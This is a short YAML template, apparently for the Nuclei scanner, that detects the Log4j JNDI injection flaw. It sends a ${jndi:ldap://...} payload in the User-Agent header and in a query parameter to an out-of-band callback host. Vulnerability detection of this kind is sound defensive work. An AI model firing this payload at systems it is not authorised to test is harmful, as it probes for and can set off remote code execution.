id: log4j-detect
info:
  author: numanturle
  name: Log4j Detect for Logs
  severity: info
requests:
- headers:
    Host: '{{Host}}'
    User-Agent: Mozilla ${jndi:ldap://{{interactsh-url}}/a}
  matchers:
  - name: http
    part: interactsh_protocol
    type: word
    words:
    - http
  - name: dns
    part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/?test=${jndi:ldap://{{interactsh-url}}/a}'
